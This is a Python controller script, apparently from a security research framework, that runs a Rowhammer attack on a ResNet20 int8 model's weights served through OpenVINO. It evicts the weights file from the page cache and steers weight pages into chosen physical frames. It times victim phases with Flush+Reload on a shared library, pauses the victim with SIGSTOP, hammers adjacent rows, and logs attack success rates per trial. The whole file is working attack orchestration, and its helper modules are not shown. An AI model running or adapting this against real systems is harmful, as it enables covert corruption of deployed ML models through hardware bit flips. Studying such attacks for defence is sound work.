#!/usr/bin/env python3
"""Online controller: F+R T1 evict+PCP, F+R T2 hammer."""

from __future__ import annotations

import argparse
import csv
import json
import os
import signal
import sys
import time
from pathlib import Path


ROOT = Path(__file__).resolve().parents[1]
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from framework.env import igpu_victim_env, ov251_python
from framework.place import (
    cleanup_evictors,
    ensure_eviction_bins,
    evict_file,
    list_shlibs_script,
    monitor_pages,
    monitor_range,
    occupy_listed,
    place_pages,
    recover_after_trial,
)
from framework.launcher import launch_cmd_victim, send_cmd, send_cmd_capture, stop_victim, wait_ready
from framework.models import get_model
from framework.targets import load_online_targets


DEFAULT_TARGETS = ROOT / "artifacts" / "resnet20_int8" / "online_targets.json"
DEFAULT_ANCHORS = ROOT / "anchors" / "memmap_fr_anchors.json"
VICTIM_PY = ROOT / "victim.py"
RESULTS = ROOT / "results"
PAGE_SIZE = 4096

CSV_FIELDS = [
    "trial",
    "device",
    "N_target",
    "target_pages",
    "eviction_success",
    "eviction_time_ms",
    "reload_time_ms",
    "compile_ok",
    "bind_ok",
    "placement_ok",
    "hammer_pages",
    "hammer_reps",
    "flips_applied",
    "infer_ok",
    "infer_ms",
    "eval_ok",
    "eval_clean_acc",
    "eval_asr",
]


def _parse_ratio(line: str, key: str) -> tuple[int, int] | None:
    if not line.startswith(key + "="):
        return None
    body = line.split("=", 1)[1]
    if "/" not in body:
        return None
    a, b = body.split("/", 1)
    return int(a), int(b)


def _kv(lines: list[str], key: str) -> str | None:
    prefix = key + "="
    for line in lines:
        if line.startswith(prefix):
            return line.split("=", 1)[1]
    return None


def one_trial(args, targets_doc, spec, weights: Path, trial: int) -> dict:
    pages = list(targets_doc.place_pages)
    n = len(pages)
    row = {k: "" for k in CSV_FIELDS}
    row.update(
        {
            "trial": trial,
            "device": "GPU",
            "N_target": n,
            "target_pages": ";".join(str(p) for p in pages),
            "eviction_success": 0,
            "eviction_time_ms": 0,
            "reload_time_ms": 0.0,
            "compile_ok": 0,
            "bind_ok": 0,
            "placement_ok": 0,
            "hammer_pages": 0,
            "hammer_reps": args.hammer_reps,
            "flips_applied": 0,
            "infer_ok": 0,
            "infer_ms": 0.0,
            "eval_ok": 0,
        }
    )
    victim = None
    held = None
    try:
        held = occupy_listed(
            pages,
            targets_doc.wanted_pfns,
            pcp_cpu=args.pcp_cpu,
            hunt_pages=args.hunt_pages,
            hunt_attempts=args.hunt_attempts,
            targets=targets_doc,
        )
        pages = [int(s["weight_page"]) for s in held.slots]
        n = len(pages)
        row["N_target"] = n
        row["target_pages"] = ";".join(str(p) for p in pages)
        vargs = [
            "--cmd-loop",
            "--manifest",
            str(args.manifest),
            "--model",
            str(args.model),
            "--weights",
            str(weights),
            "--checkpoint",
            str(args.checkpoint),
            "--eval-samples",
            str(args.eval_samples),
        ]
        victim = launch_cmd_victim(
            python=args.victim_python,
            victim_script=VICTIM_PY,
            victim_args=vargs,
            env=igpu_victim_env(),
            cwd=ROOT,
        )
        vinfo = wait_ready(victim, timeout_s=180.0)
        victim_pid = int(vinfo["pid"])
        mmap_base = int(vinfo["mmap_base"], 16)
        file_pages = weights.stat().st_size // PAGE_SIZE

        seen, err = send_cmd_capture(victim, "COMPILE", timeout_s=args.compile_timeout_s)
        for line in seen:
            print(f"  victim: {line}")
        if err:
            print(f"COMPILE failed: {err}", file=sys.stderr)
            return row
        row["compile_ok"] = 1

        os.kill(victim_pid, signal.SIGSTOP)
        ev = evict_file(
            weights,
            timeout_s=args.timeout_s,
            workers=args.workers,
            baseline_count=args.baseline_count,
            baseline_gib=args.baseline_gib,
            list_shlibs=list_shlibs_script(),
            until_pages=None if args.until_all else pages,
        )
        cleanup_evictors()
        after_ev = monitor_pages(weights, pages)
        gone = [p for p in pages if after_ev.get(p, 1) == 0]
        row["eviction_success"] = int(len(gone) == n)
        row["eviction_time_ms"] = int(ev.get("eviction_latency_us", "0")) / 1000.0
        print(f"  evict {len(gone)}/{n}")

        expected, attacker, reload_ms, place_mode = [0] * n, [0] * n, 0.0, "skip"
        if row["eviction_success"] and held is not None:
            try:
                expected, attacker, reload_ms, place_mode = place_pages(
                    weights,
                    pages,
                    held,
                    pcp_cpu=args.pcp_cpu,
                    drain_pages=args.drain_pages,
                    cs_batch=args.cs_batch,
                )
            except RuntimeError as exc:
                print(f"  place failed: {exc}")
                place_mode = "fail"
        row["reload_time_ms"] = round(reload_ms, 3)
        row["placement_ok"] = int(place_mode == f"listed {n}/{n} pfn-match")
        after_ld = monitor_range(weights, 0, max(file_pages, 1))
        extras = [p for p, r in after_ld.items() if r == 1 and p not in pages]
        print(f"  place={place_mode} extras={len(extras)}")

        os.kill(victim_pid, signal.SIGCONT)
        seen, err = send_cmd_capture(victim, "BIND", timeout_s=args.bind_timeout_s)
        for line in seen:
            print(f"  victim: {line}")
            parsed = _parse_ratio(line, "bind_ok")
            if parsed:
                row["bind_ok"] = int(parsed[0] == parsed[1] and parsed[1] > 0)
        if err:
            print(f"BIND failed: {err}", file=sys.stderr)
            return row

        os.kill(victim_pid, signal.SIGSTOP)
        from framework.hammer import replay_held_neighbors

        try:
            hammer = replay_held_neighbors(
                held,
                targets_doc,
                num_reps=args.hammer_reps,
                require=args.require_hammer,
            )
        except Exception as exc:
            print(f"  hammer failed: {exc}")
            hammer = {"status": "error", "pages": 0}
        row["hammer_pages"] = int(hammer.get("pages", 0))
        print(f"  hammer pages={row['hammer_pages']} status={hammer.get('status')}")

        os.kill(victim_pid, signal.SIGCONT)
        seen, err = send_cmd_capture(victim, "INFER", timeout_s=args.infer_timeout_s)
        for line in seen:
            print(f"  victim: {line}")
            if line.startswith("infer_ms="):
                row["infer_ms"] = float(line.split("=", 1)[1])
        if err:
            print(f"INFER failed: {err}", file=sys.stderr)
            return row
        row["infer_ok"] = 1

        if not args.skip_eval:
            seen, err = send_cmd_capture(victim, "EVAL", timeout_s=args.eval_timeout_s)
            for line in seen:
                print(f"  victim: {line}")
            if not err:
                row["eval_ok"] = 1
                acc = _kv(seen, "eval_clean_acc")
                asr = _kv(seen, "eval_asr")
                if acc is not None:
                    row["eval_clean_acc"] = acc
                if asr is not None:
                    row["eval_asr"] = asr
        send_cmd(victim, "EXIT")
    finally:
        if victim is not None:
            try:
                os.kill(victim.pid, signal.SIGCONT)
            except OSError:
                pass
        if held is not None:
            held.close()
        stop_victim(victim)
        cleanup_evictors()
    return row


def _load_fr_anchors(path: Path) -> dict:
    data = json.loads(path.read_text())
    if "massage" not in data or "hammer" not in data:
        raise SystemExit(f"{path} needs massage + hammer entries")
    return data


def one_trial_fr(args, targets_doc, spec, weights: Path, trial: int) -> dict:
    from framework.fr import FileLineMapping, Fr, wait_for_quiet_line
    from framework.find_anchors import massage_offset_for_so, pick_sit_return, resolve_pyopenvino_so
    from framework.symbols import find_bp2_set_input_tensor_caller_side_candidates

    anchors = _load_fr_anchors(args.anchor_json)
    so_path = resolve_pyopenvino_so(python=args.victim_python)
    massage_off = massage_offset_for_so(so_path, anchors)
    hammer_off = int(anchors["hammer"]["file_offset"])
    hammer_want = str(anchors["hammer"].get("validated_bytes") or "")
    listed = Path(str(anchors.get("so_path") or ""))
    got = (
        so_path.read_bytes()[hammer_off : hammer_off + 8].hex()
        if so_path.stat().st_size >= hammer_off + 8
        else ""
    )
    if listed.as_posix() != so_path.as_posix() or (hammer_want and got != hammer_want):
        hammer_off, _, _ = pick_sit_return(
            find_bp2_set_input_tensor_caller_side_candidates(str(so_path))
        )
    massage = FileLineMapping(so_path, massage_off & ~0x3F)
    hammer = FileLineMapping(so_path, hammer_off & ~0x3F)
    fr = Fr()
    pages = list(targets_doc.place_pages)
    n = len(pages)
    row = {k: "" for k in CSV_FIELDS}
    row.update(
        {
            "trial": trial,
            "device": "GPU",
            "N_target": n,
            "target_pages": ";".join(str(p) for p in pages),
            "eviction_success": 0,
            "hammer_reps": args.hammer_reps,
        }
    )
    victim = None
    held = None
    try:
        held = occupy_listed(
            pages,
            targets_doc.wanted_pfns,
            pcp_cpu=args.pcp_cpu,
            hunt_pages=args.hunt_pages,
            hunt_attempts=args.hunt_attempts,
            targets=targets_doc,
        )
        pages = [int(s["weight_page"]) for s in held.slots]
        n = len(pages)
        row["N_target"] = n
        row["target_pages"] = ";".join(str(p) for p in pages)
        vargs = [
            "--live",
            "--manifest",
            str(args.manifest),
            "--model",
            str(args.model),
            "--weights",
            str(weights),
            "--pre-bind-pause-us",
            str(args.pre_bind_pause_us),
            "--pre-infer-pause-us",
            str(args.pre_infer_pause_us),
        ]
        victim = launch_cmd_victim(
            python=args.victim_python,
            victim_script=VICTIM_PY,
            victim_args=vargs,
            env=igpu_victim_env(),
            cwd=ROOT,
        )
        vinfo = wait_ready(victim, timeout_s=180.0)
        victim_pid = int(vinfo["pid"])
        mmap_base = int(vinfo["mmap_base"], 16)
        if not wait_for_quiet_line(fr, massage.ptr, args.threshold, args.fr_pause_iters, 8, 400):
            print("warning: massage line not quiet", file=sys.stderr)
        assert victim.stdin is not None
        victim.stdin.write("GO\n")
        victim.stdin.flush()
        hit = fr.monitor_sigstop(
            massage.ptr,
            args.threshold,
            args.fr_max_samples,
            args.fr_pause_iters,
            args.min_consecutive,
            victim_pid,
        )
        print(f"  T1 detected={hit['detected']} stop={hit['sigstop_confirmed']}")
        if not hit["detected"] or not hit["sigstop_confirmed"]:
            return row

        ev = evict_file(
            weights,
            timeout_s=args.timeout_s,
            workers=args.workers,
            baseline_count=args.baseline_count,
            baseline_gib=args.baseline_gib,
            list_shlibs=list_shlibs_script(),
            until_pages=None if args.until_all else pages,
        )
        cleanup_evictors()
        after_ev = monitor_pages(weights, pages)
        gone = [p for p in pages if after_ev.get(p, 1) == 0]
        row["eviction_success"] = int(len(gone) == n)
        row["eviction_time_ms"] = int(ev.get("eviction_latency_us", "0")) / 1000.0
        print(f"  T1 evict {len(gone)}/{n}")
        if row["eviction_success"] and held is not None:
            _expected, _attacker, reload_ms, place_mode = place_pages(
                weights,
                pages,
                held,
                pcp_cpu=args.pcp_cpu,
                drain_pages=args.drain_pages,
                cs_batch=args.cs_batch,
            )
            row["reload_time_ms"] = round(reload_ms, 3)
            row["placement_ok"] = int(place_mode == f"listed {n}/{n} pfn-match")
            print(f"  place={place_mode} place_ms={row['reload_time_ms']}")
        os.kill(victim_pid, signal.SIGCONT)
        row["compile_ok"] = 1
        if not wait_for_quiet_line(fr, hammer.ptr, args.threshold, args.fr_pause_iters, 8, 800):
            print("warning: hammer line not quiet", file=sys.stderr)
        hit2 = fr.monitor_sigstop(
            hammer.ptr,
            args.threshold,
            args.fr_max_samples,
            args.fr_pause_iters,
            args.min_consecutive,
            victim_pid,
        )
        print(f"  T2 detected={hit2['detected']} stop={hit2['sigstop_confirmed']}")
        if not hit2["detected"] or not hit2["sigstop_confirmed"]:
            return row
        from framework.hammer import replay_held_neighbors

        hammer_res = replay_held_neighbors(
            held,
            targets_doc,
            num_reps=args.hammer_reps,
            require=args.require_hammer,
        )
        row["hammer_pages"] = int(hammer_res.get("pages", 0))
        os.kill(victim_pid, signal.SIGCONT)
        deadline = time.time() + max(args.infer_timeout_s, args.eval_timeout_s)
        infer_ok = False
        while time.time() < deadline:
            if victim.poll() is not None:
                break
            line = victim.stdout.readline() if victim.stdout else ""
            if not line:
                time.sleep(0.01)
                continue
            stripped = line.strip()
            print(f"  victim: {stripped}")
            if stripped.startswith("infer_ms="):
                row["infer_ms"] = float(stripped.split("=", 1)[1])
            if stripped.startswith("eval_clean_acc="):
                row["eval_clean_acc"] = stripped.split("=", 1)[1]
                row["eval_ok"] = 1
            if stripped.startswith("eval_asr="):
                row["eval_asr"] = stripped.split("=", 1)[1]
            if stripped == "OK LIVE":
                infer_ok = True
                break
        row["infer_ok"] = int(infer_ok)
    finally:
        if victim is not None:
            try:
                os.kill(victim.pid, signal.SIGCONT)
            except OSError:
                pass
        if held is not None:
            held.close()
        stop_victim(victim)
        cleanup_evictors()
        massage.close()
        hammer.close()
    return row


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--targets", type=Path, default=DEFAULT_TARGETS)
    parser.add_argument("--net", dest="model_name", default="resnet20_int8")
    parser.add_argument("--weights", type=Path, default=None)
    parser.add_argument("--manifest", type=Path, default=None)
    parser.add_argument("--model", type=Path, default=None)
    parser.add_argument("--checkpoint", type=Path, default=None)
    parser.add_argument(
        "--fr",
        action="store_true",
        default=True,
        help="Flush+Reload T1/T2 (default)",
    )
    parser.add_argument(
        "--cmd-loop",
        action="store_true",
        help="drive the victim over stdin",
    )
    parser.add_argument("--anchor-json", type=Path, default=DEFAULT_ANCHORS)
    parser.add_argument("--threshold", type=int, default=120)
    parser.add_argument("--fr-pause-iters", type=int, default=40)
    parser.add_argument("--min-consecutive", type=int, default=1)
    parser.add_argument("--fr-max-samples", type=int, default=0)
    parser.add_argument("--pre-bind-pause-us", type=int, default=2000)
    parser.add_argument("--pre-infer-pause-us", type=int, default=2000)
    parser.add_argument("--hammer-reps", type=int, default=500)
    parser.add_argument("--require-hammer", action="store_true")
    parser.add_argument(
        "--skip-eval",
        action="store_true",
        help="skip EVAL after INFER",
    )
    parser.add_argument("--eval-samples", type=int, default=256)
    parser.add_argument("--eval-timeout-s", type=float, default=600.0)
    parser.add_argument("--trials", type=int, default=1)
    parser.add_argument("--timeout-s", type=int, default=300)
    parser.add_argument("--until-all", action="store_true")
    parser.add_argument("--compile-timeout-s", type=float, default=300.0)
    parser.add_argument("--bind-timeout-s", type=float, default=180.0)
    parser.add_argument("--infer-timeout-s", type=float, default=180.0)
    parser.add_argument(
        "--workers",
        default="baseline,shlibs,randaccess,dynpressure",
        help="page-cache pressure workers",
    )
    parser.add_argument("--baseline-count", type=int, default=7)
    parser.add_argument("--baseline-gib", type=float, default=None)
    parser.add_argument("--pcp-cpu", type=int, default=0)
    parser.add_argument(
        "--hunt-pages",
        type=int,
        default=262144,
        help="4KB pages per hold spray (default 1 GiB)",
    )
    parser.add_argument(
        "--hunt-attempts",
        type=int,
        default=16,
        help="max hold sprays (first spray takes MemAvailable minus 256 MiB)",
    )
    parser.add_argument("--drain-pages", type=int, default=512)
    parser.add_argument("--cs-batch", type=int, default=1)
    parser.add_argument("--rest-s", type=float, default=8.0)
    parser.add_argument("--require-swapoff", action="store_true")
    parser.add_argument("--out", type=Path, default=RESULTS / "bridgehammer_resnet20_int8.csv")
    parser.add_argument("--python", type=Path, default=None)
    args = parser.parse_args()

    args.victim_python = args.python if args.python is not None else ov251_python()
    spec = get_model(args.model_name)
    args.manifest = args.manifest or spec.manifest
    args.model = args.model or spec.model
    args.weights = args.weights or spec.weights
    args.checkpoint = args.checkpoint or spec.checkpoint
    targets_path = args.targets if args.targets.is_absolute() else (ROOT / args.targets)
    if not targets_path.is_file():
        raise SystemExit(f"missing {targets_path}; run scripts/build_online_targets.py")
    targets_doc = load_online_targets(targets_path, ROOT)

    ensure_eviction_bins()
    sys.path.insert(0, str(ROOT / "eviction"))
    from evict import fstype_for, memavailable_kb, swap_enabled

    if swap_enabled():
        msg = "swap is on"
        if args.require_swapoff:
            raise SystemExit(msg)
        print("warning: " + msg, file=sys.stderr)

    weights = args.weights if args.weights.is_absolute() else (ROOT / args.weights)
    weights = weights.resolve()
    if fstype_for(weights) in {"tmpfs", "ramfs"}:
        raise SystemExit(f"weights on {fstype_for(weights)}")
    RESULTS.mkdir(parents=True, exist_ok=True)
    out = args.out if args.out.is_absolute() else (ROOT / args.out).resolve()
    print(
        f"model={spec.name} pages={len(targets_doc.place_pages)} "
        f"hammer_reps={args.hammer_reps}"
    )
    with out.open("w", newline="") as f:
        writer = csv.DictWriter(f, fieldnames=CSV_FIELDS)
        writer.writeheader()
        for trial in range(1, args.trials + 1):
            print(f"=== trial {trial}/{args.trials} ===")
            baseline = memavailable_kb()
            row = (
                one_trial(args, targets_doc, spec, weights, trial)
                if args.cmd_loop
                else one_trial_fr(args, targets_doc, spec, weights, trial)
            )
            writer.writerow(row)
            f.flush()
            print(
                f"trial={trial} evict={row['eviction_success']} "
                f"bind={row['bind_ok']} hammer={row['hammer_pages']} infer={row['infer_ok']}"
            )
            recover_after_trial(baseline)
            time.sleep(args.rest_s)
    print(f"wrote {out}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
